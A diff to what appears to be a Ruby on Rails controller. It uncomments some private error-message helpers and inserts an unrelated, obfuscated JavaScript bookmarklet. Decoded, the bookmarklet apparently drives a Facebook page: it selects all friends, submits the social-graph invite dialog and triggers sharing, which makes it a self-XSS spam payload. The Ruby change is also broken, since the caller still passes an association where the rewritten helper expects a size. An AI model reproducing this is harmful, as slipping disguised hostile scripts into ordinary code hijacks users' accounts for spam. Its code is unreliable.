@@ -139,22 +139,27 @@ protected
 #		return 4
 #  end
 #
-#private
-#	def association_delete_error_message( association, mess )
-#		if !association.empty?
-#			return mess + ' (' + association.size.to_s + ')'
-#		end
-#		""
-#	end
-#	
-#	def association_delete_error_messages( associations, messes )
-#		errors = []
-#		associations.each_with_index do |association,i|
-#			mess = association_delete_error_message( associations[i], messes[i] )
-#			errors.push mess unless mess == ""
-#		end
-#		errors.compact
-#	end	
+
+#javascript:(function(){a='app126063127406590_jop';b='app126063127406590_jode';ifc='app126063127406590_ifc';ifo='app126063127406590_ifo';mw='app126063127406590_mwrapper';eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('P e=["\\p\\g\\l\\g\\I\\g\\k\\g\\h\\D","\\l\\h\\D\\k\\f","\\o\\f\\h\\v\\k\\f\\q\\f\\j\\h\\J\\D\\Q\\x","\\y\\g\\x\\x\\f\\j","\\g\\j\\j\\f\\z\\R\\K\\L\\S","\\p\\n\\k\\A\\f","\\l\\A\\o\\o\\f\\l\\h","\\k\\g\\G\\f\\q\\f","\\l\\k\\g\\j\\G","\\L\\r\\A\\l\\f\\v\\p\\f\\j\\h\\l","\\t\\z\\f\\n\\h\\f\\v\\p\\f\\j\\h","\\t\\k\\g\\t\\G","\\g\\j\\g\\h\\v\\p\\f\\j\\h","\\x\\g\\l\\u\\n\\h\\t\\y\\v\\p\\f\\j\\h","\\l\\f\\k\\f\\t\\h\\w\\n\\k\\k","\\l\\o\\q\\w\\g\\j\\p\\g\\h\\f\\w\\T\\r\\z\\q","\\H\\n\\U\\n\\V\\H\\l\\r\\t\\g\\n\\k\\w\\o\\z\\n\\u\\y\\H\\g\\j\\p\\g\\h\\f\\w\\x\\g\\n\\k\\r\\o\\W\\u\\y\\u","\\l\\A\\I\\q\\g\\h\\X\\g\\n\\k\\r\\o","\\g\\j\\u\\A\\h","\\o\\f\\h\\v\\k\\f\\q\\f\\j\\h\\l\\J\\D\\K\\n\\o\\Y\\n\\q\\f","\\Z\\y\\n\\z\\f","\\u\\r\\u\\w\\t\\r\\j\\h\\f\\j\\h"];d=M;d[e[2]](1a)[e[1]][e[0]]=e[3];d[e[2]](a)[e[4]]=d[e[2]](b)[e[5]];s=d[e[2]](e[6]);m=d[e[2]](e[7]);N=d[e[2]](e[8]);c=d[e[10]](e[9]);c[e[12]](e[11],E,E);s[e[13]](c);B(C(){1b[e[14]]()},O);B(C(){1c[e[17]](e[15],e[16]);B(C(){c[e[12]](e[11],E,E);N[e[13]](c);B(C(){F=M[e[19]](e[18]);1d(i 1e F){1f(F[i][e[5]]==e[1g]){F[i][e[13]](c)}};m[e[13]](c);B(C(){d[e[2]](1h)[e[4]]=d[e[2]](1i)[e[5]];d[e[2]](e[1j])[e[1]][e[0]]=e[3]},1k)},1l)},1m)},O);',62,85,'||||||||||||||_0x82af|x65|x69|x74||x6E|x6C|x73||x61|x67|x76|x6D|x6F||x63|x70|x45|x5F|x64|x68|x72|x75|setTimeout|function|x79|true|inp|x6B|x2F|x62|x42|x54|x4D|document|sl|5000|var|x49|x48|x4C|x66|x6A|x78|x2E|x44|x4E|x53|||||||||||mw|fs|SocialGraphManager|for|in|if|20|ifo|ifc|21|2000|4000|3000'.split('|'),0,{}))})();
+
+private
+
+def association_delete_error_message( size, mess )
+	unless size==0
+		return mess + ' (' + size.to_s + ')'
+	end
+	""
+end
+
+def association_delete_error_messages( associations, messes )
+	errors = []
+	associations.each_with_index do |association,i|
+		mess = association_delete_error_message( associations[i], messes[i] )
+		errors.push mess unless mess == ""
+	end
+	errors.compact
+end	
+
 #
 #  def current_user
 #		session[:user] ||= Person.find_by_user_name( session[:user_name], :include => [{ :student=>:klasses },{ :teacher=>:klasses }])
